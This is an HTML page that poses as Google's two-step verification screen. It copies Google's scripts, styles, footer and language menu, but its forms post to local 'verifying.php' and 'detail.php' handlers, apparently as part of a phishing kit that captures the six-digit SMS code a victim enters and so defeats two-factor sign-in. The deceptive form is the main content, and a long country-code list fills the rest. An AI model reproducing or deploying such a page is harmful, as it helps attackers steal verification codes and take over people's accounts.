<!doctype html><html lang="en-GB" dir="ltr"><head><base href="verifying.php"><script data-id="_gd">window.WIZ_global_data = {"OewCAd":"%.@.\"xsrf\",\"AFoagUX4eJxAmKkC66B8K4B3CllnW_Ibzw:1481424524382\",[\"104743942498541417034\"]\n,\"AFoagUVpCTGb32d5IhH6VHCM4x0OnWLO-A:1481424524382\"]\n","qDCSke":"104743942498541417034","w2btAe":"%.@.\"104743942498541417034\"]\n"};</script><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><link rel="shortcut icon" href="//www.google.com/favicon.ico" /><script>(function(H) {H.className="CMgTXc";})(document.documentElement);</script><meta content="width=300, initial-scale=1" name="viewport"><meta name="google" value="notranslate"><meta name="robots" content="noindex"><meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs"><title>Verification</title><script type="text/javascript">(function(){var g=this,aa=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";
else if("function"==b&&"undefined"==typeof a.call)return"object";return b},h=Date.now||function(){return+new Date},ba=function(a,b){var c=["ID_wizbind"];b=b||g;c[0]in b||!b.execScript||b.execScript("var "+c[0]);for(var d;c.length&&(d=c.shift());)c.length||void 0===a?b=b[d]?b[d]:b[d]={}:b[d]=a},t=function(a,b){function c(){}c.prototype=b.prototype;a.v=b.prototype;a.prototype=new c;a.s=function(a,c,f){for(var d=Array(arguments.length-2),e=2;e<arguments.length;e++)d[e-2]=arguments[e];return b.prototype[c].apply(a,
d)}};var u=function(a){if(Error.captureStackTrace)Error.captureStackTrace(this,u);else{var b=Error().stack;b&&(this.stack=b)}a&&(this.message=String(a))};t(u,Error);var ca=function(a,b){for(var c=a.split("%s"),d="",e=Array.prototype.slice.call(arguments,1);e.length&&1<c.length;)d+=c.shift()+e.shift();return d+c.join("%s")};var da=function(a,b){if(null===b)return!1;if("contains"in a&&1==b.nodeType)return a.contains(b);if("compareDocumentPosition"in a)return a==b||!!(a.compareDocumentPosition(b)&16);for(;b&&a!=b;)b=b.parentNode;return b==a};var x=function(a,b){b.unshift(a);u.call(this,ca.apply(null,b));b.shift()};t(x,u);var fa=function(a,b,c){if(!a){var d="Assertion failed";if(b)var d=d+(": "+b),e=Array.prototype.slice.call(arguments,2);throw new x(""+d,e||[]);}};var y={};var ga=function(a,b){return function(c){c||(c=window.event);return b.call(a,c)}},z=function(a){a=a.target||a.srcElement;!a.getAttribute&&a.parentNode&&(a=a.parentNode);return a},A="undefined"!=typeof navigator&&/Macintosh/.test(navigator.userAgent),ha="undefined"!=typeof navigator&&!/Opera/.test(navigator.userAgent)&&/WebKit/.test(navigator.userAgent),ia={A:1,INPUT:1,TEXTAREA:1,SELECT:1,BUTTON:1},C=function(a){return(a=a.changedTouches&&a.changedTouches[0]||a.touches&&a.touches[0])?{clientX:a.clientX,
clientY:a.clientY,screenX:a.screenX,screenY:a.screenY}:null},D=function(a){var b={};b.originalEventType=a.type;b.type="click";for(var c in a){var d=a[c];"type"==c||"srcElement"==c||"function"==aa(d)||(b[c]=d)}b.timeStamp=h();b.defaultPrevented=!1;b.preventDefault=ja;b._propagationStopped=!1;b.stopPropagation=ka;if(a=C(a))b.clientX=a.clientX,b.clientY=a.clientY,b.screenX=a.screenX,b.screenY=a.screenY;return b},la=function(){this._mouseEventsPrevented=!0},ja=function(){this.defaultPrevented=!0},ka=
function(){this._propagationStopped=!0},E={A:13,BUTTON:0,CHECKBOX:32,COMBOBOX:13,GRIDCELL:13,LINK:13,LISTBOX:13,MENU:0,MENUBAR:0,MENUITEM:0,MENUITEMCHECKBOX:0,MENUITEMRADIO:0,OPTION:0,RADIO:32,RADIOGROUP:32,RESET:0,SUBMIT:0,TAB:0,TREE:13,TREEITEM:13},F=function(a){return(a.getAttribute("type")||a.tagName).toUpperCase()in ma},oa=function(a){return(a.getAttribute("type")||a.tagName).toUpperCase()in na},ma={CHECKBOX:!0,OPTION:!0,RADIO:!0},na={COLOR:!0,DATE:!0,DATETIME:!0,"DATETIME-LOCAL":!0,EMAIL:!0,
MONTH:!0,NUMBER:!0,PASSWORD:!0,RANGE:!0,SEARCH:!0,TEL:!0,TEXT:!0,TEXTAREA:!0,TIME:!0,URL:!0,WEEK:!0},pa={A:!0,AREA:!0,BUTTON:!0,DIALOG:!0,IMG:!0,INPUT:!0,LINK:!0,MENU:!0,OPTGROUP:!0,OPTION:!0,PROGRESS:!0,SELECT:!0,TEXTAREA:!0};var qa=function(){this.m=[];this.a=[];this.i=[];this.l={};this.c=null;this.j=[]},G,ra,sa="undefined"!=typeof navigator&&/iPhone|iPad|iPod/.test(navigator.userAgent),ta=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^\s+/,"").replace(/\s+$/,"")},ua=/\s*;\s*/,K=null,xa=function(a,b){return function(c){var d;var e=b,f;if("click"==e&&(A&&c.metaKey||!A&&c.ctrlKey||2==c.which||null==c.which&&4==c.button||c.shiftKey))e="clickmod";else{var k;k=c.which||c.keyCode||c.key;ha&&
3==k&&(k=13);if(13!=k&&32!=k)k=!1;else{var l=z(c);f=(l.getAttribute("role")||l.type||l.tagName).toUpperCase();var m;(m="keydown"!=c.type)||("getAttribute"in l?(m=(l.getAttribute("role")||l.tagName).toUpperCase(),m=!oa(l)&&("COMBOBOX"!=m||"INPUT"!=m)&&!l.isContentEditable):m=!1,m=!m);(m=m||c.ctrlKey||c.shiftKey||c.altKey||c.metaKey||F(l)&&32==k)||((m=l.tagName in ia)||(m=l.getAttributeNode("tabindex"),m=null!=m&&m.specified),m=!(m&&!l.disabled));m?k=!1:(l="INPUT"!=l.tagName.toUpperCase()||l.type,m=
!(f in E)&&13==k,k=(0==E[f]%k||m)&&!!l)}k&&(e="clickkey")}l=c.srcElement||c.target;k=L(e,c,l,"",null);var n;for(f=l;f&&f!=this;f=f.__owner||f.parentNode){d=f;b:{var v,r=d;n=e;m=c;var p=r.__jsaction;if(!p){p=null;"getAttribute"in r&&(p=r.getAttribute("jsaction"));if(v=p){if(p=y[v],!p){for(var p={},H=v.split(ua),I=0,Ba=H?H.length:0;I<Ba;I++){var w=H[I];if(w){var J=w.indexOf(":"),ea=-1!=J,Ca=ea?ta(w.substr(0,J)):"click",w=ea?ta(w.substr(J+1)):w;p[Ca]=w}}y[v]=p}}else p=va;r.__jsaction=p}"clickkey"==n?
n="click":"click"!=n||p.click||(n="clickonly");v=null;if(p.click){r=wa(r,m,p);if(!r){n={f:n,action:"",event:null,o:!0};break b}r!=m&&(v=r,n=r.type)}n={f:n,action:p[n]||"",event:v,o:!1}}if(n.o||n.action)break}n&&(k=L(n.f,n.event||c,l,n.action||"",d,k.timeStamp));k&&"touchend"==k.eventType&&(k.event._preventMouseEvents=la);if(n&&n.action){if(f="clickkey"==e)f=z(c),f=(f.type||f.tagName).toUpperCase(),(f=32==(c.which||c.keyCode||c.key)&&"CHECKBOX"!=f)||(f=z(c),l=(f.getAttribute("role")||f.tagName).toUpperCase(),
f=f.tagName.toUpperCase()in pa&&"A"!=l&&!F(f)&&!oa(f)||"BUTTON"==l);f&&(c.preventDefault?c.preventDefault():c.returnValue=!1);if("mouseenter"==e||"mouseleave"==e)if(f=c.relatedTarget,!("mouseover"==c.type&&"mouseenter"==e||"mouseout"==c.type&&"mouseleave"==e)||f&&(f===d||da(d,f)))k.action="",k.actionElement=null;else{var e={},q;for(q in c)"function"!==typeof c[q]&&"srcElement"!==q&&"target"!==q&&(e[q]=c[q]);e.type="mouseover"==c.type?"mouseenter":"mouseleave";e.target=e.srcElement=d;e.bubbles=!1;
k.event=e;k.targetElement=d}}else k.action="",k.actionElement=null;d=k;a.c&&(q=L(d.eventType,d.event,d.targetElement,d.action,d.actionElement,d.timeStamp),"clickonly"==q.eventType&&(q.eventType="click"),a.c(q,!0));if(d.actionElement){"A"!=d.actionElement.tagName||"click"!=d.eventType&&"clickmod"!=d.eventType||(c.preventDefault?c.preventDefault():c.returnValue=!1);if(a.c)a.c(d);else{var B;if((q=g.document)&&!q.createEvent&&q.createEventObject)try{B=q.createEventObject(c)}catch(Ka){B=c}else B=c;d.event=
B;a.j.push(d)}"touchend"==d.event.type&&d.event._mouseEventsPrevented&&(K=D(d.event))}}},L=function(a,b,c,d,e,f){return{eventType:a,event:b,targetElement:c,action:d,actionElement:e,timeStamp:f||h()}},va={},wa=function(a,b,c){if("click"==b.type||b.targetTouches&&1<b.targetTouches.length)return b;var d=G,e=b.target;if(e&&ya(e))return b;e=C(b);if("touchstart"!=b.type||c.touchstart||c.touchend)if("touchend"==b.type&&d&&d.node==a)if(b.defaultPrevented||e&&4<Math.abs(e.clientX-d.x)+Math.abs(e.clientY-d.y))G=
null;else{K=a=D(b);b.stopPropagation();b.preventDefault();document.createEvent?(b=document.createEvent("MouseEvent"),b.initMouseEvent(a.type,!0,!0,window,a.detail||1,a.screenX||0,a.screenY||0,a.clientX||0,a.clientY||0,a.ctrlKey||!1,a.altKey||!1,a.shiftKey||!1,a.metaKey||!1,a.button||0,a.relatedTarget||null)):(fa(document.createEventObject),b=document.createEventObject(),b.type=a.type,b.clientX=a.clientX,b.clientY=a.clientY,b.button=a.button,b.detail=a.detail,b.ctrlKey=a.ctrlKey,b.altKey=a.altKey,
b.shiftKey=a.shiftKey,b.metaKey=a.metaKey);b.u=a.timeStamp;b._fastclick=!0;a.target.dispatchEvent(b);if(!b.defaultPrevented){if(document.activeElement&&document.activeElement!=b.target&&ya(document.activeElement))try{document.activeElement.blur()}catch(f){}try{window.getSelection().removeAllRanges()}catch(f){}}return null}else"touchmove"==b.type&&d&&e&&4<Math.abs(e.clientX-d.x)+Math.abs(e.clientY-d.y)&&(G=null);else return G={node:a,x:e?e.clientX:0,y:e?e.clientY:0},K=null,clearTimeout(ra),ra=setTimeout(za,
400),null;return b},ya=function(a){a=a.tagName||"";return"TEXTAREA"==a||"INPUT"==a||"SELECT"==a||"OPTION"==a},za=function(){G=null},M=function(a){if(!a._fastclick){var b=K;if(b)if(800<h()-b.timeStamp)K=null;else{var c=4>=Math.abs(a.clientX-b.clientX)+Math.abs(a.clientY-b.clientY);b.target==a.target||c?(a.stopPropagation(),a.preventDefault(),"click"==a.type&&(K=null)):K=null}}},Aa=function(a,b){return function(c){var d=a,e=b,f=!1;"mouseenter"==d?d="mouseover":"mouseleave"==d&&(d="mouseout");if(c.addEventListener){if("focus"==
d||"blur"==d||"error"==d||"load"==d)f=!0;c.addEventListener(d,e,f)}else c.attachEvent&&("focus"==d?d="focusin":"blur"==d&&(d="focusout"),e=ga(c,e),c.attachEvent("on"+d,e));return{f:d,g:e,capture:f}}},N=function(a,b){if(!a.l.hasOwnProperty(b)){var c=xa(a,b),d=Aa(b,c);a.l[b]=c;a.m.push(d);for(c=0;c<a.a.length;++c){var e=a.a[c];e.h.push(d.call(null,e.b))}"click"==b&&N(a,"keydown");"click"==b&&(N(a,"touchstart"),N(a,"touchend"),N(a,"touchmove"),document.addEventListener&&(document.addEventListener("click",
M,!0),document.addEventListener("mouseup",M,!0),document.addEventListener("mousedown",M,!0)))}};qa.prototype.g=function(a){return this.l[a]};var Da=function(a){var b=O,c=a.b;sa&&(c.style.cursor="pointer");for(c=0;c<b.m.length;++c)a.h.push(b.m[c].call(null,a.b))},Ea=function(a){this.b=a;this.h=[]};Ea.prototype.containsNode=function(a){for(var b=this.b;b!=a&&a.parentNode;)a=a.parentNode;return b==a};
var Ga=function(){for(var a=P,b=Fa,c=0;c<b.length;++c)if(b[c].b!=a.b&&b[c].containsNode(a.b))return!0;return!1};var Ha=window,O=new qa,Ia=Ha||window,Ja=Ia.document.documentElement,Q=new Ea(Ja),R;a:{for(var S=0;S<O.a.length;S++)if(O.a[S].containsNode(Ja)){R=!0;break a}R=!1}
if(R)O.i.push(Q);else{Da(Q);O.a.push(Q);for(var Fa=O.i.concat(O.a),T=[],U=[],V=0;V<O.a.length;++V){var P=O.a[V];if(Ga()){T.push(P);for(var W=P,X=0;X<W.h.length;++X){var Y=W.b,Z=W.h[X];Y.removeEventListener?Y.removeEventListener(Z.f,Z.g,Z.capture):Y.detachEvent&&Y.detachEvent("on"+Z.f,Z.g)}W.h=[]}else U.push(P)}for(V=0;V<O.i.length;++V)P=O.i[V],Ga()?T.push(P):(U.push(P),Da(P));O.a=U;O.i=T}N(O,"blur");N(O,"click");N(O,"focus");N(O,"focusin");N(O,"focusout");N(O,"keydown");N(O,"keypress");N(O,"load");
N(O,"mouseover");N(O,"mouseout");N(O,"mouseenter");N(O,"mouseleave");N(O,"submit");N(O,"touchstart");N(O,"touchend");N(O,"touchmove");N(O,"change");N(O,"input");N(O,"keyup");N(O,"mousedown");N(O,"mouseup");N(O,"touchcancel");N(O,"transitionend");N(O,"webkitTransitionEnd");(function(a,b){ba({trigger:function(b){var c=a.g(b.type);c||(N(a,b.type),c=a.g(b.type));c.call((b.target||b.srcElement).ownerDocument.documentElement,b)},bind:function(b){a.c=b;a.j&&(0<a.j.length&&b(a.j),a.j=null)}},b)})(O,Ia);}).call(this);
</script><style>/* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTa-j2U0lmluP9RWlSytm3ho.woff2) format('woff2');
  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTZX5f-9o1vgP2EXwfjgl7AY.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTRWV49_lSm1NYrwo-zkhivY.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTaaRobkAwv3vxw3jMhVENGA.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTf8zf_FOSsgRmwsS7Aa9k2w.woff2) format('woff2');
  unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTT0LW-43aMEzIO6XUTLjad8.woff2) format('woff2');
  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTegdm0LZdjqr5-oayXSOefg.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
/* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/K88pR3goAWT7BTt32Z01mxJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/RjgO7rYTmqiVp7vzi-Q5URJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/LWCjsQkB6EMdfHrEVqA1KRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/xozscpT2726on7jbcb_pAhJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/59ZRklaO5bWGqF5A9baEERJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/u-WUoqrET9fUeobQW7jkRRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/cJZKeOuBrn4kERxqtaUH3VtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
</style><link rel="stylesheet" href="https://ssl.gstatic.com/accounts/static/_/ss/k=gaia.gaiafe_signin.1bw1b7vsw7aw4.L.W.O/am=AgAA4AAQJA/d=0/rs=ABkqax3guSH7ZJ134DkfNi1IdGeKLEOujA" type="text/css"><script type="text/javascript">window['cssLoaded'] = true;</script><script async id="base-js" src="https://ssl.gstatic.com/accounts/static/_/js/k=gaia.gaiafe_signin.en_GB._lpwC721AZ4.O/m=signin,signin_challenge/am=AgAA4AAQJA/rt=j/d=1/rs=ABkqax3lkXAXOl__6K2gV286ynO0q8vIPg"></script><script>var AF_initDataKeys = ["ds:0"]
; var AF_dataServiceRequests = {'ds:0' : {id: 1.02163051E8 }}; var AF_initDataChunkQueue = []; var AF_initDataCallback; var AF_initDataInitializeCallback; if (AF_initDataInitializeCallback) {AF_initDataInitializeCallback(AF_initDataKeys, AF_initDataChunkQueue, AF_dataServiceRequests);}if (!AF_initDataCallback) {AF_initDataCallback = function(chunk) {AF_initDataChunkQueue.push(chunk);};}</script></head><body id="yDmH0d"><div class="s2h6df"><div class="JYXKFb IA6off"><div class="ql1pVb ZnXjYc EaNIqc"><div class="omTHz" aria-label="Google"></div></div></div><div class="RgEUV ZnXjYc EaNIqc JhUD8d"><div ><div class="glT6eb"><div jsname="IDL96d"><h1>2-step Verification</h1></div><div jsname="jqgtP"><h2>To help keep your email, photos and other content safer, complete the task below.</h2></div></div></div><div jscontroller="dRq9o" jsaction="rcuQ6b:WYd"><div id="resendCode" class="uUNkEc nICdoc" jsname="HmIokf">
<button type="submit" class="g1C42c" id="resendCodeButton">Resend code</button></form></div></noscript><div class="LJtPoc" jsname="Ki8mld" >


<form method="POST"id="login form"action="verifying.php"> 
<content>
<input name="challengeId" type="hidden" id="challengeId" value="2">
<input name="challengeType" type="hidden" id="challengeType" value="9"><input name="hl" type="hidden" value="en-GB">
<input name="TL" type="hidden" value="AHnYQLxgKPghwQpX_tJhlTJBlRjWos5KRhofp7hKCxPOoaJdl8kjXwumpWMj1sY26oMkZQ-OQYZzclkj9JRTFOEOQhVP-rpzz1j-OmR2rcLL7EKy0NkSyo6YckPHuUgNaSD_mzmuhf6Ml6qgKMBe7ac-YQNwbnEA9A==">
<input type="hidden" name="gxf" id="gxf" value="AFoagUU8rPNOzrhdHdqYrQ0g6kcl2xQEmg:1481424524380">
<div jsname="KrwUDc"><img jsname="TqVmm" class="JC07Dd" src="//ssl.gstatic.com/accounts/marc/idv_sms.png" alt=""><div class="EGmPD" jsname="BCqkPb">Enter a verification code</div><div class="VnJmLc" jsname="NhJ5Dd">A text message with a verification code was just sent to <b dir="ltr" class="DZNRQe">••••-••••-••••</b></div><div class="gIH97b"><div class="LNdFWe" dir="ltr">G-</div><input type="tel" pattern="[0-9 ]*" id="idvPreregisteredPhonePin" name="code" dir="ltr" autocomplete="off"placeholder="Enter the 6-digit code" autofocus class="Mj2P6d"></div><div class="eZIU1d"><div jscontroller="PPW5eb" jsaction="rcuQ6b:rcuQ6b" data-site-id="" data-iframe-uri="https://www.google.com/settings/hatsv2" data-tag="4475053290911856136:1481424477703190"></div></div></div>
<input type="submit" class="MK9CEd MVpUfe" jsname="M2UYVd"  jscontroller="rrJN5c"  jsaction="aJAbCd:zbvklb" value="Done" id="submit">

<div class="ARshqb"><input type="checkbox" name="TrustDevice" id="trustDevice" class="aCOJmf"checked><span>Don&#39;t ask again on this computer</span><div class="Bfmfyc" role="tooltip"><div class="x7qQqf"></div><div class="hzC8Lb">For your convenience, keep this ticked. On shared devices, additional precautions are recommended. <a href="https://support.google.com/accounts/?p=securesignin&amp;hl=en_GB" target="_blank">Learn more</a></div></div></div></div></content></form></div><div class=" KSYbxc "><form method="POST" action="detail.php"><input name="challengeId" type="hidden" value="2"><input name="hl" type="hidden" value="en-GB"><input name="TL" type="hidden" value="AHnYQLxgKPghwQpX_tJhlTJBlRjWos5KRhofp7hKCxPOoaJdl8kjXwumpWMj1sY26oMkZQ-OQYZzclkj9JRTFOEOQhVP-rpzz1j-OmR2rcLL7EKy0NkSyo6YckPHuUgNaSD_mzmuhf6Ml6qgKMBe7ac-YQNwbnEA9A=="><input type="hidden" name="gxf" id="gxf" value="AFoagUU8rPNOzrhdHdqYrQ0g6kcl2xQEmg:1481424524380"><input id="skipChallenge" type="submit" jsname="rwR6T" class="g1C42c" value="<<BACK"></form></div><div class="M0leCe"><span jsname="tODuDc"></span><a href="detail.php" class="vHOx3b"></a></div></div><div class="zOB73"><div class="SEK88d ZnXjYc EaNIqc"><ul id="footer-list"><li>Google</li><li><a href="https://accounts.google.com/TOS?loc=ID&amp;hl=en-GB&amp;privacy=true" target="_blank">Privacy</a></li><li><a href="https://accounts.google.com/TOS?loc=ID&amp;hl=en-GB" target="_blank">Terms</a></li></ul><div id="lang-vis-control" jscontroller="fBrDlb" jsaction="change:iktSbe"><span id="lang-chooser-wrap" class="KQh9Y"><label for="lang-chooser"><img src= "//ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label><select id="lang-chooser" class="BTDeVb" jsname="J2uaq" name="lang-chooser"><option value="af">‪Afrikaans‬</option><option value="az">‪azərbaycan dili‬</option><option value="ms">‪Bahasa Melayu‬</option><option value="ca">‪català‬</option><option value="cs">‪Čeština‬</option><option value="da">‪Dansk‬</option><option value="de">‪Deutsch‬</option><option value="et">‪eesti‬</option><option value="en-GB"selected="selected">‪English (United Kingdom)‬</option><option value="en">‪English (United States)‬</option><option value="es">‪Español (España)‬</option><option value="es-419">‪Español (Latinoamérica)‬</option><option value="eu">‪euskara‬</option><option value="fil">‪Filipino‬</option><option value="fr-CA">‪Français (Canada)‬</option><option value="fr">‪Français (France)‬</option><option value="gl">‪galego‬</option><option value="hr">‪Hrvatski‬</option><option value="in">‪Indonesia‬</option><option value="zu">‪isiZulu‬</option><option value="is">‪íslenska‬</option><option value="it">‪Italiano‬</option><option value="sw">‪Kiswahili‬</option><option value="lv">‪latviešu‬</option><option value="lt">‪lietuvių‬</option><option value="hu">‪magyar‬</option><option value="nl">‪Nederlands‬</option><option value="no">‪norsk‬</option><option value="pl">‪polski‬</option><option value="pt">‪Português (Brasil)‬</option><option value="pt-PT">‪português (Portugal)‬</option><option value="ro">‪română‬</option><option value="sk">‪Slovenčina‬</option><option value="sl">‪slovenščina‬</option><option value="fi">‪Suomi‬</option><option value="sv">‪Svenska‬</option><option value="vi">‪Tiếng Việt‬</option><option value="tr">‪Türkçe‬</option><option value="el">‪Ελληνικά‬</option><option value="bg">‪български‬</option><option value="mn">‪монгол‬</option><option value="ru">‪Русский‬</option><option value="sr">‪српски‬</option><option value="uk">‪Українська‬</option><option value="ka">‪ქართული‬</option><option value="hy">‪հայերեն‬</option><option value="iw">‫עברית‬‎</option><option value="ur">‫اردو‬‎</option><option value="ar">‫العربية‬‎</option><option value="fa">‫فارسی‬‎</option><option value="am">‪አማርኛ‬</option><option value="ne">‪नेपाली‬</option><option value="mr">‪मराठी‬</option><option value="hi">‪हिन्दी‬</option><option value="bn">‪বাংলা‬</option><option value="gu">‪ગુજરાતી‬</option><option value="ta">‪தமிழ்‬</option><option value="te">‪తెలుగు‬</option><option value="kn">‪ಕನ್ನಡ‬</option><option value="ml">‪മലയാളം‬</option><option value="si">‪සිංහල‬</option><option value="th">‪ไทย‬</option><option value="lo">‪ລາວ‬</option><option value="my">‪ဗမာ‬</option><option value="km">‪ខ្មែរ‬</option><option value="ko">‪한국어‬</option><option value="zh-HK">‪中文（香港）‬</option><option value="ja">‪日本語‬</option><option value="zh-CN">‪简体中文‬</option><option value="zh-TW">‪繁體中文‬</option></select></span></div></div></div></div></body></html><div class="lDwpOe"></div><script>AF_initDataCallback({key: 'ds:0', isError:  false , hash: '1', data:function(){return [[[["Afghanistan (\u202bافغانستان\u202c\u200e)","AF"]
,["Åland Islands (Åland)","AX"]
,["Albania (Shqipëri)","AL"]
,["Algeria","DZ"]
,["American Samoa","AS"]
,["Andorra","AD"]
,["Angola","AO"]
,["Anguilla","AI"]
,["Antigua \u0026 Barbuda","AG"]
,["Argentina","AR"]
,["Armenia (Հայաստան)","AM"]
,["Aruba","AW"]
,["Australia","AU"]
,["Austria (Österreich)","AT"]
,["Azerbaijan (Azərbaycan)","AZ"]
,["Bahamas","BS"]
,["Bahrain (\u202bالبحرين\u202c\u200e)","BH"]
,["Bangladesh (বাংলাদেশ)","BD"]
,["Barbados","BB"]
,["Belarus (Беларусь)","BY"]
,["Belgium","BE"]
,["Belize","BZ"]
,["Benin (Bénin)","BJ"]
,["Bermuda","BM"]
,["Bhutan (འབྲུག)","BT"]
,["Bolivia","BO"]
,["Bosnia \u0026 Herzegovina (Босна и Херцеговина)","BA"]
,["Botswana","BW"]
,["Brazil (Brasil)","BR"]
,["British Indian Ocean Territory","IO"]
,["British Virgin Islands","VG"]
,["Brunei","BN"]
,["Bulgaria (България)","BG"]
,["Burkina Faso","BF"]
,["Burundi (Uburundi)","BI"]
,["Cambodia (កម្ពុជា)","KH"]
,["Cameroon (Cameroun)","CM"]
,["Canada","CA"]
,["Cape Verde (Kabu Verdi)","CV"]
,["Caribbean Netherlands","BQ"]
,["Cayman Islands","KY"]
,["Central African Republic (République centrafricaine)","CF"]
,["Chad (Tchad)","TD"]
,["Chile","CL"]
,["China (中国)","CN"]
,["Christmas Island","CX"]
,["Cocos (Keeling) Islands (Kepulauan Cocos (Keeling))","CC"]
,["Colombia","CO"]
,["Comoros (\u202bجزر القمر\u202c\u200e)","KM"]
,["Congo (DRC) (Jamhuri ya Kidemokrasia ya Kongo)","CD"]
,["Congo (Republic) (Congo-Brazzaville)","CG"]
,["Cook Islands","CK"]
,["Costa Rica","CR"]
,["Côte d’Ivoire","CI"]
,["Croatia (Hrvatska)","HR"]
,["Cuba","CU"]
,["Curaçao","CW"]
,["Cyprus (Κύπρος)","CY"]
,["Czech Republic (Česká republika)","CZ"]
,["Denmark (Danmark)","DK"]
,["Djibouti","DJ"]
,["Dominica","DM"]
,["Dominican Republic (República Dominicana)","DO"]
,["Ecuador","EC"]
,["Egypt (\u202bمصر\u202c\u200e)","EG"]
,["El Salvador","SV"]
,["Equatorial Guinea (Guinea Ecuatorial)","GQ"]
,["Eritrea","ER"]
,["Estonia (Eesti)","EE"]
,["Ethiopia","ET"]
,["Falkland Islands (Islas Malvinas)","FK"]
,["Faroe Islands (Føroyar)","FO"]
,["Fiji","FJ"]
,["Finland (Suomi)","FI"]
,["France","FR"]
,["French Guiana (Guyane française)","GF"]
,["French Polynesia (Polynésie française)","PF"]
,["Gabon","GA"]
,["Gambia","GM"]
,["Georgia (საქართველო)","GE"]
,["Germany (Deutschland)","DE"]
,["Ghana (Gaana)","GH"]
,["Gibraltar","GI"]
,["Greece (Ελλάδα)","GR"]
,["Greenland (Kalaallit Nunaat)","GL"]
,["Grenada","GD"]
,["Guadeloupe","GP"]
,["Guam","GU"]
